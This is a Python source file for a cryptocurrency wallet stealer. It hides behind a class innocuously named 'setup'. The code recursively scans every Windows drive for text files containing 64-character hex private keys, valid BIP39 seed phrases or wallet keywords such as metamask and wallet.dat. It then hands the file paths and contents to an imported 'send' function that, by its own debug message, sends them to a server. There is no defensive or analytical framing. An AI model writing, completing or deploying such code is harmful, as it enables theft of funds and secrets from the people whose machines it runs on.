import os
import re
import time
from pathlib import Path
from export import send
from mnemonic import Mnemonic

# Use the mnemonic library for validation (no need for huge word list)
mnemo = Mnemonic("english")

class setup:
    def __init__(self):
        self.data = []
        self.files_scanned = 0
        self.found_files = []
    
    def run(self):
        print("[DEBUG] Full system scan started")
        self._scan_full_system()
        print(f"[DEBUG] Scan complete. Scanned: {self.files_scanned} files")
        print(f"[DEBUG] Found: {len(self.found_files)} files with seeds/keys")
        
        if self.found_files:
            for file_info in self.found_files:
                self.data.append(file_info)
            print("[DEBUG] Sending data to server...")
            send(self.data)
            print("[DEBUG] Data sent")
        else:
            print("[DEBUG] No data found, skipping send")
    
    def _scan_full_system(self):
        """Scan the entire file system."""
        drives = self._get_drives()
        print(f"[DEBUG] Scanning drives: {drives}")
        
        for drive in drives:
            print(f"[DEBUG] Scanning drive: {drive}")
            self._scan_directory(drive)
    
    def _get_drives(self):
        """Get all available drives on Windows."""
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letter}:\\"
            if os.path.exists(path):
                drives.append(path)
        return drives
    
    def _scan_directory(self, directory):
        """Scan a directory recursively."""
        try:
            for root, dirs, files in os.walk(directory):
                # Skip system folders for speed
                skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)',
                            'System32', 'System Volume Information', '$Recycle.Bin',
                            'AppData\\Local\\Temp', 'AppData\\Local\\Microsoft\\Windows\\INetCache']
                
                dirs[:] = [d for d in dirs if d not in skip_dirs and not d.startswith('$')]
                
                for file in files:
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    # Only scan text files
                    text_extensions = {'.txt', '.log', '.json', '.dat', '.bak', '.old', '.md',
                                       '.cfg', '.conf', '.ini', '.csv', '.xml', '.yml', '.yaml',
                                       '.html', '.htm', '.js', '.py', '.java', '.c', '.cpp',
                                       '.go', '.rs', '.ts', '.php', '.rb', '.sh', '.bash',
                                       '.ps1', '.bat', '.cmd'}
                    
                    if ext in text_extensions or not ext:
                        self._scan_file(file_path)
                    
                    self.files_scanned += 1
                    if self.files_scanned % 1000 == 0:
                        print(f"[DEBUG] Scanned {self.files_scanned} files...")
                        
        except Exception as e:
            print(f"[DEBUG] Error scanning {directory}: {e}")
    
    def _scan_file(self, file_path):
        """Scan a single file for seeds or private keys."""
        try:
            # Skip files larger than 10MB
            if os.path.getsize(file_path) > 10 * 1024 * 1024:
                return
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(100000)  # Read first 100KB
                
                if not content or len(content) < 20:
                    return
                
                # Check for private keys (64 hex chars)
                if re.search(r'(?:0x)?[a-fA-F0-9]{64}', content):
                    print(f"[DEBUG] Found private key in: {file_path}")
                    self.found_files.append({
                        'type': 'private_key',
                        'path': file_path,
                        'content': content[:5000]
                    })
                    return
                
                # Check for seed phrases using mnemonic library validation
                # Look for 12 or 24 words in a row that are all BIP39 words
                words = re.findall(r'\b[a-zA-Z]+\b', content)
                
                for i in range(len(words) - 11):  # At least 12 words
                    potential_seed = ' '.join(words[i:i+12])
                    
                    # Check if it's exactly 12 words
                    if len(potential_seed.split()) == 12:
                        try:
                            # Try to validate as mnemonic
                            if mnemo.check(potential_seed):
                                print(f"[DEBUG] Found VALID seed phrase in: {file_path}")
                                self.found_files.append({
                                    'type': 'seed_phrase',
                                    'path': file_path,
                                    'content': potential_seed
                                })
                                return
                        except:
                            pass
                
                # Also check for 24-word seeds
                for i in range(len(words) - 23):
                    potential_seed = ' '.join(words[i:i+24])
                    if len(potential_seed.split()) == 24:
                        try:
                            if mnemo.check(potential_seed):
                                print(f"[DEBUG] Found VALID 24-word seed phrase in: {file_path}")
                                self.found_files.append({
                                    'type': 'seed_phrase',
                                    'path': file_path,
                                    'content': potential_seed
                                })
                                return
                        except:
                            pass
                
                # Check for common seed-related keywords (fallback)
                seed_keywords = ['mnemonic', 'seed phrase', 'recovery phrase', 
                                 'private key', 'wallet.dat', 'metamask',
                                 'trustwallet', 'secret recovery']
                
                content_lower = content.lower()
                if any(keyword in content_lower for keyword in seed_keywords):
                    # If it has keywords and BIP39 words, flag it
                    bip39_words = 0
                    for word in words:
                        try:
                            if mnemo.check(word):
                                bip39_words += 1
                        except:
                            pass
                    
                    if bip39_words >= 6:
                        print(f"[DEBUG] Found potential seed file: {file_path}")
                        self.found_files.append({
                            'type': 'potential_seed',
                            'path': file_path,
                            'content': content[:5000]
                        })
                        
        except Exception as e:
            pass  # Silently skip files that can't be read